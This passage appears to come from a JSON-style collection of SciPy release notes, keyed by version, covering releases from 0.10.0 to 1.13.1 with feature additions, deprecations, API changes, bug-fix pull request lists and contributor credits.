matrices\nrespectively.\n\n``scipy.sparse.csc_matrix`` and ``csr_matrix`` now support the operations\n``sin``, ``tan``, ``arcsin``, ``arctan``, ``sinh``, ``tanh``, ``arcsinh``,\n``arctanh``, ``rint``, ``sign``, ``expm1``, ``log1p``, ``deg2rad``, ``rad2deg``,\n``floor``, ``ceil`` and ``trunc``.  Previously, these operations had to be\nperformed by operating on the matrices' ``data`` attribute.\n\n\nLSMR iterative solver\n---------------------\n\nLSMR, an iterative method for solving (sparse) linear and linear\nleast-squares systems, was added as ``scipy.sparse.linalg.lsmr``.\n\n\nDiscrete Sine Transform\n-----------------------\n\nBindings for the discrete sine transform functions have been added to\n``scipy.fftpack``.\n\n\n``scipy.interpolate`` improvements\n----------------------------------\n\nFor interpolation in spherical coordinates, the three classes\n``scipy.interpolate.SmoothSphereBivariateSpline``,\n``scipy.interpolate.LSQSphereBivariateSpline``, and\n``scipy.interpolate.RectSphereBivariateSpline`` have been added.\n\n\nBinned statistics (``scipy.stats``)\n-----------------------------------\n\nThe stats module has gained functions to do binned statistics, which are a\ngeneralization of histograms, in 1-D, 2-D and multiple dimensions:\n``scipy.stats.binned_statistic``, ``scipy.stats.binned_statistic_2d`` and\n``scipy.stats.binned_statistic_dd``.\n\n\nDeprecated features\n===================\n\n``scipy.sparse.cs_graph_components`` has been made a part of the sparse graph\nsubmodule, and renamed to ``scipy.sparse.csgraph.connected_components``.\nCalling the former routine will result in a deprecation warning.\n\n``scipy.misc.radon`` has been deprecated.  A more full-featured radon transform\ncan be found in scikits-image.\n\n``scipy.io.save_as_module`` has been deprecated.  A better way to save multiple\nNumpy arrays is the ``numpy.savez`` function.\n\nThe `xa` and `xb` parameters for all distributions in\n``scipy.stats.distributions`` already weren't used; they have now been\ndeprecated.\n\n\nBackwards incompatible changes\n==============================\n\nRemoval of ``scipy.maxentropy``\n-------------------------------\n\nThe ``scipy.maxentropy`` module, which was deprecated in the 0.10.0 release,\nhas been removed.  Logistic regression in scikits.learn is a good and modern\nalternative for this functionality.\n\n\nMinor change in behavior of ``splev``\n-------------------------------------\n\nThe spline evaluation function now behaves similarly to ``interp1d``\nfor size-1 arrays.  Previous behavior::\n\n    >>> from scipy.interpolate import splev, splrep, interp1d\n    >>> x = [1,2,3,4,5]\n    >>> y = [4,5,6,7,8]\n    >>> tck = splrep(x, y)\n    >>> splev([1], tck)\n    4.\n    >>> splev(1, tck)\n    4.\n\nCorrected behavior::\n\n    >>> splev([1], tck)\n    array([ 4.])\n    >>> splev(1, tck)\n    array(4.)\n\nThis affects also the ``UnivariateSpline`` classes.\n\n\nBehavior of ``scipy.integrate.complex_ode``\n-------------------------------------------\n\nThe behavior of the ``y`` attribute of ``complex_ode`` is changed.\nPreviously, it expressed the complex-valued solution in the form::\n\n    z = ode.y[::2] + 1j * ode.y[1::2]\n\nNow, it is directly the complex-valued solution::\n\n    z = ode.y\n\n\nMinor change in behavior of T-tests\n-----------------------------------\n\nThe T-tests ``scipy.stats.ttest_ind``, ``scipy.stats.ttest_rel`` and\n``scipy.stats.ttest_1samp`` have been changed so that 0 / 0 now returns NaN\ninstead of 1.\n\n\nOther changes\n=============\n\nThe SuperLU sources in ``scipy.sparse.linalg`` have been updated to version 4.3\nfrom upstream.\n\nThe function ``scipy.signal.bode``, which calculates magnitude and phase data\nfor a continuous-time system, has been added.\n\nThe two-sample T-test ``scipy.stats.ttest_ind`` gained an option to compare\nsamples with unequal variances, i.e. Welch's T-test.\n\n``scipy.misc.logsumexp`` now takes an optional ``axis`` keyword argument.\n\n\nAuthors\n=======\n\nThis release contains work by the following people (contributed at least\none patch to this release, names in alphabetical order):\n\n* Jeff Armstrong\n* Chad Baker\n* Brandon Beacher +\n* behrisch +\n* borishim +\n* Matthew Brett\n* Lars Buitinck\n* Luis Pedro Coelho +\n* Johann Cohen-Tanugi\n* David Cournapeau\n* dougal +\n* Ali Ebrahim +\n* endolith +\n* Bj\u00f8rn Forsman +\n* Robert Gantner +\n* Sebastian Gassner +\n* Christoph Gohlke\n* Ralf Gommers\n* Yaroslav Halchenko\n* Charles Harris\n* Jonathan Helmus +\n* Andreas Hilboll +\n* Marc Honnorat +\n* Jonathan Hunt +\n* Maxim Ivanov +\n* Thouis (Ray) Jones\n* Christopher Kuster +\n* Josh Lawrence +\n* Denis Laxalde +\n* Travis Oliphant\n* Joonas Paalasmaa +\n* Fabian Pedregosa\n* Josef Perktold\n* Gavin Price +\n* Jim Radford +\n* Andrew Schein +\n* Skipper Seabold\n* Jacob Silterra +\n* Scott Sinclair\n* Alexis Tabary +\n* Martin Teichmann\n* Matt Terry +\n* Nicky van Foreest +\n* Jacob Vanderplas\n* Patrick Varilly +\n* Pauli Virtanen\n* Nils Wagner +\n* Darryl Wally +\n* Stefan van der Walt\n* Liming Wang +\n* David Warde-Farley +\n* Warren Weckesser\n* Sebastian Werk +\n* Mike Wimmer +\n* Tony S Yu +\n\nA total of 55 people contributed to this release.\nPeople with a \"+\" by their names contributed a patch for the first time.\n\n\n\n==========================\n", "0.19.1": "------------------------\n\n- `7211 <https://github.com/scipy/scipy/pull/7211>`__: BUG: convolve may yield inconsistent dtypes with method changed\n- `7216 <https://github.com/scipy/scipy/pull/7216>`__: BUG: integrate: fix refcounting bug in quad()\n- `7229 <https://github.com/scipy/scipy/pull/7229>`__: MAINT: special: Rewrite a test of wrightomega\n- `7261 <https://github.com/scipy/scipy/pull/7261>`__: FIX: Corrected the transformation matrix permutation\n- `7265 <https://github.com/scipy/scipy/pull/7265>`__: BUG: Fix broken axis handling in spectral functions\n- `7266 <https://github.com/scipy/scipy/pull/7266>`__: FIX 7262: ckdtree crashes in query_knn.\n- `7279 <https://github.com/scipy/scipy/pull/7279>`__: Upcast half- and single-precision floats to doubles in BSpline...\n- `7336 <https://github.com/scipy/scipy/pull/7336>`__: BUG: Fix signal.dfreqresp for StateSpace systems\n- `7419 <https://github.com/scipy/scipy/pull/7419>`__: Fix several issues in ``sparse.load_npz``, ``save_npz``\n- `7420 <https://github.com/scipy/scipy/pull/7420>`__: BUG: stats: allow integers as kappa4 shape parameters\n\n\n\n==========================\n", "0.12.0": "many new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  There have been a number of deprecations and\nAPI changes in this release, which are documented below.  All users\nare encouraged to upgrade to this release, as there are a large number\nof bug-fixes and optimizations.  Moreover, our development attention\nwill now shift to bug-fix releases on the 0.12.x branch, and on adding\nnew features on the master branch.\n\nSome of the highlights of this release are:\n\n  - Completed QHull wrappers in scipy.spatial.\n  - cKDTree now a drop-in replacement for KDTree.\n  - A new global optimizer, basinhopping.\n  - Support for Python 2 and Python 3 from the same code base (no more 2to3).\n\nThis release requires Python 2.6, 2.7 or 3.1-3.3 and NumPy 1.5.1 or greater.\nSupport for Python 2.4 and 2.5 has been dropped as of this release.\n\n\nNew features\n============\n\n``scipy.spatial`` improvements\n------------------------------\n\ncKDTree feature-complete\n^^^^^^^^^^^^^^^^^^^^^^^^\nCython version of KDTree, cKDTree, is now feature-complete.  Most operations\n(construction, query, query_ball_point, query_pairs, count_neighbors and\nsparse_distance_matrix) are between 200 and 1000 times faster in cKDTree than\nin KDTree.  With very minor caveats, cKDTree has exactly the same interface as\nKDTree, and can be used as a drop-in replacement.\n\nVoronoi diagrams and convex hulls\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n`scipy.spatial` now contains functionality for computing Voronoi\ndiagrams and convex hulls using the Qhull library. (Delaunay\ntriangulation was available since Scipy 0.9.0.)\n\nDelaunay improvements\n^^^^^^^^^^^^^^^^^^^^^\nIt's now possible to pass in custom Qhull options in Delaunay\ntriangulation. Coplanar points are now also recorded, if present.\nIncremental construction of Delaunay triangulations is now also\npossible.\n\nSpectral estimators (``scipy.signal``)\n--------------------------------------\nThe functions ``scipy.signal.periodogram`` and ``scipy.signal.welch`` were\nadded, providing DFT-based spectral estimators.\n\n\n``scipy.optimize`` improvements\n-------------------------------\n\nCallback functions in L-BFGS-B and TNC\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nA callback mechanism was added to L-BFGS-B and TNC minimization solvers.\n\nBasin hopping global optimization (``scipy.optimize.basinhopping``)\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nA new global optimization algorithm.  Basinhopping is designed to efficiently\nfind the global minimum of a smooth function.\n\n\n``scipy.special`` improvements\n------------------------------\n\nRevised complex error functions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nThe computation of special functions related to the error function now uses a\nnew `Faddeeva library from MIT <http://ab-initio.mit.edu/Faddeeva>`__ which\nincreases their numerical precision. The scaled and imaginary error functions\n``erfcx`` and ``erfi`` were also added, and the Dawson integral ``dawsn`` can\nnow be evaluated for a complex argument.\n\nFaster orthogonal polynomials\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nEvaluation of orthogonal polynomials (the ``eval_*`` routines) in now\nfaster in ``scipy.special``, and their ``out=`` argument functions\nproperly.\n\n\n``scipy.sparse.linalg`` features\n--------------------------------\n- In ``scipy.sparse.linalg.spsolve``, the ``b`` argument can now be either\n  a vector or a matrix.\n- ``scipy.sparse.linalg.inv`` was added.  This uses ``spsolve`` to compute\n  a sparse matrix inverse.\n- ``scipy.sparse.linalg.expm`` was added.  This computes the exponential of\n  a sparse matrix using a similar algorithm to the existing dense array\n  implementation in ``scipy.linalg.expm``.\n\n\nListing Matlab(R) file contents in ``scipy.io``\n-----------------------------------------------\nA new function ``whosmat`` is available in ``scipy.io`` for inspecting contents\nof MAT files without reading them to memory.\n\n\nDocumented BLAS and LAPACK low-level interfaces (``scipy.linalg``)\n------------------------------------------------------------------\nThe modules `scipy.linalg.blas` and `scipy.linalg.lapack` can be used\nto access low-level BLAS and LAPACK functions.\n\n\nPolynomial interpolation improvements (``scipy.interpolate``)\n-------------------------------------------------------------\nThe barycentric, Krogh, piecewise and pchip polynomial interpolators in\n``scipy.interpolate`` accept now an ``axis`` argument.\n\n\nDeprecated features\n===================\n\n`scipy.lib.lapack`\n------------------\nThe module `scipy.lib.lapack` is deprecated. You can use `scipy.linalg.lapack`\ninstead. The module `scipy.lib.blas` was deprecated earlier in Scipy 0.10.0.\n\n\n`fblas` and `cblas`\n-------------------\nAccessing the modules `scipy.linalg.fblas`, `cblas`, `flapack`, `clapack` is\ndeprecated. Instead, use the modules `scipy.linalg.lapack` and\n`scipy.linalg.blas`.\n\n\nBackwards incompatible changes\n==============================\n\nRemoval of ``scipy.io.save_as_module``\n--------------------------------------\nThe function ``scipy.io.save_as_module`` was deprecated in Scipy 0.11.0, and is\nnow removed.\n\nIts private support modules ``scipy.io.dumbdbm_patched`` and\n``scipy.io.dumb_shelve`` are also removed.\n\n`axis` argument added to `scipy.stats.scoreatpercentile`\n--------------------------------------------------------\n\nThe function `scipy.stats.scoreatpercentile` has been given an `axis`\nargument.  The default argument is `axis=None`, which means the calculation\nis done on the flattened array.  Before this change, `scoreatpercentile`\nwould act as if `axis=0` had been given.  Code using `scoreatpercentile`\nwith a multidimensional array will need to add `axis=0` to the function call\nto preserve the old behavior.  (This API change was not noticed until\nlong after the release of 0.12.0.)\n\n\nAuthors\n=======\n* Anton Akhmerov +\n* Alexander Ebersp\u00e4cher +\n* Anne Archibald\n* Jisk Attema +\n* K.-Michael Aye +\n* bemasc +\n* Sebastian Berg +\n* Fran\u00e7ois Boulogne +\n* Matthew Brett\n* Lars Buitinck\n* Steven Byrnes +\n* Tim Cera +\n* Christian +\n* Keith Clawson +\n* David Cournapeau\n* Nathan Crock +\n* endolith\n* Bradley M. Froehle +\n* Matthew R Goodman\n* Christoph Gohlke\n* Ralf Gommers\n* Robert David Grant +\n* Yaroslav Halchenko\n* Charles Harris\n* Jonathan Helmus\n* Andreas Hilboll\n* Hugo +\n* Oleksandr Huziy\n* Jeroen Demeyer +\n* Johannes Sch\u00f6nberger +\n* Steven G. Johnson +\n* Chris Jordan-Squire\n* Jonathan Taylor +\n* Niklas Kroeger +\n* Jerome Kieffer +\n* kingson +\n* Josh Lawrence\n* Denis Laxalde\n* Alex Leach +\n* Tim Leslie\n* Richard Lindsley +\n* Lorenzo Luengo +\n* Stephen McQuay +\n* MinRK\n* Sturla Molden +\n* Eric Moore +\n* mszep +\n* Matt Newville +\n* Vlad Niculae\n* Travis Oliphant\n* David Parker +\n* Fabian Pedregosa\n* Josef Perktold\n* Zach Ploskey +\n* Alex Reinhart +\n* Gilles Rochefort +\n* Ciro Duran Santillli +\n* Jan Schlueter +\n* Jonathan Scholz +\n* Anthony Scopatz\n* Skipper Seabold\n* Fabrice Silva +\n* Scott Sinclair\n* Jacob Stevenson +\n* Sturla Molden +\n* Julian Taylor +\n* thorstenkranz +\n* John Travers +\n* True Price +\n* Nicky van Foreest\n* Jacob Vanderplas\n* Patrick Varilly\n* Daniel Velkov +\n* Pauli Virtanen\n* Stefan van der Walt\n* Warren Weckesser\n\nA total of 75 people contributed to this release.\nPeople with a \"+\" by their names contributed a patch for the first time.\n\n\n\n=========================\n", "0.13.1": "==========================\n\nSciPy 0.13.1 is a bug-fix release with no new features compared to 0.13.0.\nThe only changes are several fixes in ``ndimage``, one of which was a serious\nregression in ``ndimage.label`` (Github issue 3025), which gave\nincorrect results in 0.13.0.\n\nIssues fixed\n------------\n\n- 3025: ``ndimage.label`` returns incorrect results in scipy 0.13.0\n- 1992: ``ndimage.label`` return type changed from int32 to uint32\n- 1992: ``ndimage.find_objects`` doesn't work with int32 input in some cases\n\n\n==========================\n", "1.13.1": "------------------------\n\n* `20280 <https://github.com/scipy/scipy/pull/20280>`__: MAINT: added doc/source/.jupyterlite.doit.db to .gitignore See...\n* `20322 <https://github.com/scipy/scipy/pull/20322>`__: BUG: sparse: align dok_array.pop() to dict.pop() for case with...\n* `20333 <https://github.com/scipy/scipy/pull/20333>`__: BUG: sync pocketfft again\n* `20381 <https://github.com/scipy/scipy/pull/20381>`__: REL, MAINT: prep for 1.13.1\n* `20401 <https://github.com/scipy/scipy/pull/20401>`__: DOC: optimize: fix wrong optional argument name in \\`root(method=\"lm\")\\`.\n* `20435 <https://github.com/scipy/scipy/pull/20435>`__: DOC: add missing deprecations from 1.13.0 release notes\n* `20437 <https://github.com/scipy/scipy/pull/20437>`__: MAINT/DOC: fix syntax in 1.13.0 release notes\n* `20444 <https://github.com/scipy/scipy/pull/20444>`__: BUG: sparse: Clean up 1D input handling to sparse array/matrix...\n* `20449 <https://github.com/scipy/scipy/pull/20449>`__: DOC: remove spurious backtick from release notes\n* `20473 <https://github.com/scipy/scipy/pull/20473>`__: BUG: linalg: fix ordering of complex conj gen eigenvalues\n* `20474 <https://github.com/scipy/scipy/pull/20474>`__: TST: tolerance bumps for the conda-forge builds\n* `20484 <https://github.com/scipy/scipy/pull/20484>`__: TST: compare absolute values of U and VT in pydata-sparse SVD...\n* `20505 <https://github.com/scipy/scipy/pull/20505>`__: BUG: Include Python.h before system headers.\n* `20516 <https://github.com/scipy/scipy/pull/20516>`__: BUG: linalg: fix eigh(1x1 array, driver='evd') f2py check\n* `20527 <https://github.com/scipy/scipy/pull/20527>`__: BUG: \\`spherical_in\\` for \\`n=0\\` and \\`z=0\\`\n* `20530 <https://github.com/scipy/scipy/pull/20530>`__: BLD: Fix error message for f2py generation fail\n* `20533 <https://github.com/scipy/scipy/pull/20533>`__: TST: Adapt to \\`__array__(copy=True)\\`\n* `20537 <https://github.com/scipy/scipy/pull/20537>`__: BLD: Move Python-including files to start of source.\n* `20567 <https://github.com/scipy/scipy/pull/20567>`__: REV: 1.13.x: revert changes to f2py and tempita handling in meson.build...\n* `20569 <https://github.com/scipy/scipy/pull/20569>`__: update openblas to 0.3.27\n* `20573 <https://github.com/scipy/scipy/pull/20573>`__: BUG: Fix error with 180 degree rotation in Rotation.align_vectors()...\n* `20586 <https://github.com/scipy/scipy/pull/20586>`__: MAINT: optimize.linprog: fix bug when integrality is a list of...\n* `20592 <https://github.com/scipy/scipy/pull/20592>`__: MAINT: stats.wilcoxon: fix failure with multidimensional \\`x\\`...\n* `20601 <https://github.com/scipy/scipy/pull/20601>`__: MAINT: lint: temporarily disable UP031\n* `20607 <https://github.com/scipy/scipy/pull/20607>`__: BUG: handle uint arrays in factorial{,2,k}\n* `20611 <https://github.com/scipy/scipy/pull/20611>`__: BUG: prevent QHull message stream being closed twice\n* `20629 <https://github.com/scipy/scipy/pull/20629>`__: MAINT/DEV: lint: disable UP032\n* `20633 <https://github.com/scipy/scipy/pull/20633>`__: BUG: fix Vor/Delaunay segfaults\n* `20644 <https://github.com/scipy/scipy/pull/20644>`__: BUG: ndimage.value_indices: deal with unfixed types\n* `20653 <https://github.com/scipy/scipy/pull/20653>`__: BUG: ndimage: fix origin handling for \\`{minimum, maximum}_filter\\`\n* `20654 <https://github.com/scipy/scipy/pull/20654>`__: MAINT: stats.yulesimon: fix kurtosis\n* `20687 <https://github.com/scipy/scipy/pull/20687>`__: BUG: sparse: Fix summing duplicates for CSR/CSC creation from...\n* `20702 <https://github.com/scipy/scipy/pull/20702>`__: BUG: stats: Fix \\`zipf.pmf\\` and \\`zipfian.pmf\\` for int32 \\`k\\`\n* `20727 <https://github.com/scipy/scipy/pull/20727>`__: CI: pin Python for MacOS conda\n\n\n=========================\n", "1.6.2": "-----------------------\n\n* `12862 <https://github.com/scipy/scipy/pull/12862>`__: REL: put upper bounds on versions of dependencies\n* `13575 <https://github.com/scipy/scipy/pull/13575>`__: BUG: fix \\`gaussian_kernel_estimate\\` on S390X\n* `13586 <https://github.com/scipy/scipy/pull/13586>`__: BUG: sparse: Create a utility function \\`getdata\\`\n* `13598 <https://github.com/scipy/scipy/pull/13598>`__: MAINT, BUG: enforce contiguous layout for output array in Rotation.as_euler\n* `13687 <https://github.com/scipy/scipy/pull/13687>`__: BUG: fix scipy.odr to consider given delta0 argument\n\n\n==========================\n", "0.10.0": "many new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  There have been a limited number of deprecations\nand backwards-incompatible changes in this release, which are documented\nbelow.  All users are encouraged to upgrade to this release, as there\nare a large number of bug-fixes and optimizations.  Moreover, our \ndevelopment attention will now shift to bug-fix releases on the 0.10.x \nbranch, and on adding new features on the development master branch.\n\nRelease highlights:\n\n  - Support for Bento as optional build system.\n  - Support for generalized eigenvalue problems, and all shift-invert modes\n    available in ARPACK.\n\nThis release requires Python 2.4-2.7 or 3.1- and NumPy 1.5 or greater.\n\n\nNew features\n============\n\nBento: new optional build system\n--------------------------------\n\nScipy can now be built with `Bento <http://cournape.github.com/Bento/>`_.\nBento has some nice features like parallel builds and partial rebuilds, that\nare not possible with the default build system (distutils).  For usage\ninstructions see BENTO_BUILD.txt in the scipy top-level directory.\n\nCurrently Scipy has three build systems, distutils, numscons and bento.\nNumscons is deprecated and is planned and will likely be removed in the next\nrelease.\n\n\nGeneralized and shift-invert eigenvalue problems in ``scipy.sparse.linalg``\n---------------------------------------------------------------------------\n\nThe sparse eigenvalue problem solver functions\n``scipy.sparse.eigs/eigh`` now support generalized eigenvalue\nproblems, and all shift-invert modes available in ARPACK.\n\n\nDiscrete-Time Linear Systems (``scipy.signal``)\n-----------------------------------------------\n\nSupport for simulating discrete-time linear systems, including\n``scipy.signal.dlsim``, ``scipy.signal.dimpulse``, and ``scipy.signal.dstep``,\nhas been added to SciPy.  Conversion of linear systems from continuous-time to\ndiscrete-time representations is also present via the\n``scipy.signal.cont2discrete`` function.\n\n\nEnhancements to ``scipy.signal``\n--------------------------------\n\nA Lomb-Scargle periodogram can now be computed with the new function\n``scipy.signal.lombscargle``.\n\nThe forward-backward filter function ``scipy.signal.filtfilt`` can now\nfilter the data in a given axis of an n-dimensional numpy array.\n(Previously it only handled a 1-dimensional array.)  Options have been\nadded to allow more control over how the data is extended before filtering.\n\nFIR filter design with ``scipy.signal.firwin2`` now has options to create\nfilters of type III (zero at zero and Nyquist frequencies) and IV (zero at zero\nfrequency).\n\n\nAdditional decomposition options (``scipy.linalg``)\n---------------------------------------------------\n\nA sort keyword has been added to the Schur decomposition routine \n(``scipy.linalg.schur``) to allow the sorting of eigenvalues in\nthe resultant Schur form.\n\nAdditional special matrices (``scipy.linalg``)\n----------------------------------------------\n\nThe functions ``hilbert`` and ``invhilbert`` were added to ``scipy.linalg``.\n\n\nEnhancements to ``scipy.stats``\n-------------------------------\n\n* The *one-sided form* of Fisher's exact test is now also implemented in\n  ``stats.fisher_exact``. \n* The function ``stats.chi2_contingency`` for computing the chi-square test of\n  independence of factors in a contingency table has been added, along with\n  the related utility functions ``stats.contingency.margins`` and\n  ``stats.contingency.expected_freq``.\n\n\nEnhancements to ``scipy.special``\n---------------------------------\n\nThe functions ``logit(p) = log(p/(1-p))``\nand ``expit(x) = 1/(1+exp(-x))`` have been implemented as\n``scipy.special.logit`` and ``scipy.special.expit`` respectively.\n\n\nBasic support for Harwell-Boeing file format for sparse matrices\n----------------------------------------------------------------\n\nBoth read and write are support through a simple function-based API, as well as\na more complete API to control number format. The functions may be found in\nscipy.sparse.io.\n\nThe following features are supported:\n\n    * Read and write sparse matrices in the CSC format\n    * Only real, symmetric, assembled matrix are supported (RUA format)\n\n\nDeprecated features\n===================\n\n``scipy.maxentropy``\n--------------------\n\nThe maxentropy module is unmaintained, rarely used and has not been functioning\nwell for several releases.  Therefore it has been deprecated for this release,\nand will be removed for scipy 0.11.  Logistic regression in scikits.learn is a\ngood alternative for this functionality.  The ``scipy.maxentropy.logsumexp``\nfunction has been moved to ``scipy.misc``.\n\n\n``scipy.lib.blas``\n------------------\n\nThere are similar BLAS wrappers in ``scipy.linalg`` and ``scipy.lib``.  These\nhave now been consolidated as ``scipy.linalg.blas``, and ``scipy.lib.blas`` is\ndeprecated.\n\n\nNumscons build system\n---------------------\n\nThe numscons build system is being replaced by Bento, and will be removed in\none of the next scipy releases.\n\n\nBackwards-incompatible changes\n==============================\n\nThe deprecated name `invnorm` was removed from ``scipy.stats.distributions``,\nthis distribution is available as `invgauss`.\n\nThe following deprecated nonlinear solvers from ``scipy.optimize`` have been\nremoved::\n\n  - ``broyden_modified`` (bad performance)\n  - ``broyden1_modified`` (bad performance)\n  - ``broyden_generalized`` (equivalent to ``anderson``)\n  - ``anderson2`` (equivalent to ``anderson``)\n  - ``broyden3`` (obsoleted by new limited-memory broyden methods)\n  - ``vackar`` (renamed to ``diagbroyden``)\n \n\nOther changes\n=============\n\n``scipy.constants`` has been updated with the CODATA 2010 constants.\n\n``__all__`` dicts have been added to all modules, which has cleaned up the\nnamespaces (particularly useful for interactive work).\n\nAn API section has been added to the documentation, giving recommended import\nguidelines and specifying which submodules are public and which aren't.\n\n\nAuthors\n=======\n\nThis release contains work by the following people (contributed at least\none patch to this release, names in alphabetical order):\n\n* Jeff Armstrong +\n* Matthew Brett\n* Lars Buitinck +\n* David Cournapeau\n* FI$H 2000 +\n* Michael McNeil Forbes +\n* Matty G +\n* Christoph Gohlke\n* Ralf Gommers\n* Yaroslav Halchenko\n* Charles Harris\n* Thouis (Ray) Jones +\n* Chris Jordan-Squire +\n* Robert Kern\n* Chris Lasher +\n* Wes McKinney +\n* Travis Oliphant\n* Fabian Pedregosa\n* Josef Perktold\n* Thomas Robitaille +\n* Pim Schellart +\n* Anthony Scopatz +\n* Skipper Seabold +\n* Fazlul Shahriar +\n* David Simcha +\n* Scott Sinclair +\n* Andrey Smirnov +\n* Collin RM Stocks +\n* Martin Teichmann +\n* Jake Vanderplas +\n* Ga\u00ebl Varoquaux +\n* Pauli Virtanen\n* Stefan van der Walt\n* Warren Weckesser\n* Mark Wiebe +\n\nA total of 35 people contributed to this release.\nPeople with a \"+\" by their names contributed a patch for the first time.\n\n\n\n==========================\n", "1.9.2": "-----------------------\n\n* `16628 <https://github.com/scipy/scipy/pull/16628>`__: FIX: Updated dtype resolution in \\`_stack_along_minor_axis\\`\n* `16814 <https://github.com/scipy/scipy/pull/16814>`__: FIX: milp: return feasible solutions if available on time out\n* `16842 <https://github.com/scipy/scipy/pull/16842>`__: ENH: cibuildwheel infrastructure\n* `16909 <https://github.com/scipy/scipy/pull/16909>`__: MAINT: minimize, restore squeezed ((1.0)) addresses #16898\n* `16911 <https://github.com/scipy/scipy/pull/16911>`__: REL: prep for SciPy 1.9.2\n* `16922 <https://github.com/scipy/scipy/pull/16922>`__: DOC: update version switcher for 1.9.1 and pin theme to 0.9\n* `16934 <https://github.com/scipy/scipy/pull/16934>`__: MAINT: cast \\`linear_sum_assignment\\` to PyCFunction\n* `16943 <https://github.com/scipy/scipy/pull/16943>`__: BLD: use compiler flags in a more portable way\n* `16954 <https://github.com/scipy/scipy/pull/16954>`__: MAINT: stats.mode: fix bug with \\`axis!=1\\`, \\`nan_policy='omit'\\`,...\n* `16966 <https://github.com/scipy/scipy/pull/16966>`__: MAINT: fix NumPy upper bound\n* `16969 <https://github.com/scipy/scipy/pull/16969>`__: BLD: fix usage of \\`get_install_data\\`, which defaults to purelib\n* `16975 <https://github.com/scipy/scipy/pull/16975>`__: DOC: Update numpy supported versions for 1.9.2\n* `16991 <https://github.com/scipy/scipy/pull/16991>`__: BLD: fixes for building with MSVC and Intel Fortran\n* `17011 <https://github.com/scipy/scipy/pull/17011>`__: Rudimentary test for manylinux_aarch64 with cibuildwheel\n* `17013 <https://github.com/scipy/scipy/pull/17013>`__: BLD: make MKL detection a little more robust, add notes on TODOs\n* `17046 <https://github.com/scipy/scipy/pull/17046>`__: CI: Update cibuildwheel to 2.10.1\n* `17055 <https://github.com/scipy/scipy/pull/17055>`__: MAINT: stats.pearson3: fix ppf for negative skew\n* `17064 <https://github.com/scipy/scipy/pull/17064>`__: BUG: Fix numerical precision error of \\`truncnorm.logcdf\\` when...\n* `17096 <https://github.com/scipy/scipy/pull/17096>`__: FIX: ensure a hold on GIL before raising warnings/errors\n* `17127 <https://github.com/scipy/scipy/pull/17127>`__: TST: stats.studentized_range: fix incorrect test\n* `17131 <https://github.com/scipy/scipy/pull/17131>`__: MAINT: pyproject.toml: Update build system requirements\n* `17132 <https://github.com/scipy/scipy/pull/17132>`__: MAINT: 1.9.2 backports\n\n\n==========================\n", "1.6.1": "-----------------------\n\n* `13318 <https://github.com/scipy/scipy/pull/13318>`__: REL: prepare for SciPy 1.6.1\n* `13344 <https://github.com/scipy/scipy/pull/13344>`__: BUG: fftpack doesn't work with ndarray shape argument\n* `13345 <https://github.com/scipy/scipy/pull/13345>`__: MAINT: Replace scipy.take with numpy.take in FFT function docstrings.\n* `13354 <https://github.com/scipy/scipy/pull/13354>`__: BUG: optimize: rename private functions to include leading underscore\n* `13387 <https://github.com/scipy/scipy/pull/13387>`__: BUG: Support big-endian platforms and big-endian WAVs\n* `13394 <https://github.com/scipy/scipy/pull/13394>`__: BUG: Fix Python crash by allocating larger array in LSQBivariateSpline\n* `13400 <https://github.com/scipy/scipy/pull/13400>`__: BUG: sparse: Better validation for BSR ctor\n* `13403 <https://github.com/scipy/scipy/pull/13403>`__: BUG: sparse: Propagate dtype through CSR/CSC constructors\n* `13414 <https://github.com/scipy/scipy/pull/13414>`__: BUG: maintain dtype of SphericalVoronoi regions\n* `13422 <https://github.com/scipy/scipy/pull/13422>`__: FIX: optimize: use npy_intp to store array dims for lsap\n* `13425 <https://github.com/scipy/scipy/pull/13425>`__: BUG: spatial: make Rotation picklable\n* `13426 <https://github.com/scipy/scipy/pull/13426>`__: BUG: \\`has_sorted_indices\\` and \\`has_canonical_format\\` should...\n* `13430 <https://github.com/scipy/scipy/pull/13430>`__: BUG: stats: Fix exponnorm.cdf and exponnorm.sf for small K\n* `13470 <https://github.com/scipy/scipy/pull/13470>`__: MAINT: silence warning generated by \\`spatial.directed_hausdorff\\`\n* `13473 <https://github.com/scipy/scipy/pull/13473>`__: TST: fix failures due to new FutureWarnings in NumPy 1.21.dev0\n* `13479 <https://github.com/scipy/scipy/pull/13479>`__: MAINT: update directed_hausdorff Cython code\n* `13485 <https://github.com/scipy/scipy/pull/13485>`__: BUG: KDTree weighted count_neighbors doesn't work between two...\n* `13503 <https://github.com/scipy/scipy/pull/13503>`__: TST: fix \\`test_fortranfile_read_mixed_record\\` on big-endian...\n* `13518 <https://github.com/scipy/scipy/pull/13518>`__: DOC: document that pip >= 20.3.3 is needed for macOS 11\n* `13520 <https://github.com/scipy/scipy/pull/13520>`__: BLD: update reqs based on oldest-supported-numpy in pyproject.toml\n* `13567 <https://github.com/scipy/scipy/pull/13567>`__: TST, BUG: adjust tol on test_equivalence\n\n\n==========================\n", "0.13.0": "many new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  There have been a number of deprecations and\nAPI changes in this release, which are documented below.  All users\nare encouraged to upgrade to this release, as there are a large number\nof bug-fixes and optimizations.  Moreover, our development attention\nwill now shift to bug-fix releases on the 0.13.x branch, and on adding\nnew features on the master branch.\n\nThis release requires Python 2.6, 2.7 or 3.1-3.3 and NumPy 1.5.1 or greater.\nHighlights of this release are:\n\n  - support for fancy indexing and boolean comparisons with sparse matrices\n  - interpolative decompositions and matrix functions in the linalg module\n  - two new trust-region solvers for unconstrained minimization\n\n\nNew features\n============\n\n``scipy.integrate`` improvements\n--------------------------------\n\nN-dimensional numerical integration\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA new function `scipy.integrate.nquad`, which provides N-dimensional\nintegration functionality with a more flexible interface than ``dblquad`` and\n``tplquad``, has been added.\n\n``dopri*`` improvements\n^^^^^^^^^^^^^^^^^^^^^^^\n\nThe intermediate results from the ``dopri`` family of ODE solvers can now be\naccessed by a *solout* callback function.\n\n\n``scipy.linalg`` improvements\n-----------------------------\n\nInterpolative 